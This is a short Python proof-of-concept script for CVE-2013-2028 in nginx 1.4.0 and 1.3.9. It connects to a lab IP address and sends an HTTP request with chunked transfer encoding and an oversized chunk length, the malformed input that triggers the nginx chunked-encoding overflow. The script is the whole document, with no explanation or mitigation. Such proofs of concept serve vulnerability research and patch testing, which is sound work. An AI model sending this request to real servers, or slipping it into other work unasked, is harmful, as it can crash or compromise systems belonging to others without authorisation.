
########################################################################################################################
# CVE-2013-2028 nginx 1.4.0 1.3.9  POC
########################################################################################################################
import socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.182.128",80))
s.send("GET / HTTP/1.1\r\nServer: AntBean\r\nHost: 192.168.182.128\r\nTransfer-Encoding: chunked\r\nVia: TestMyBug\r\n\r\nfffffffff6000000\r\nAAAA\r\n4\r\nAAAA\r\n0\r\n\r\n");
s.recv(1024)
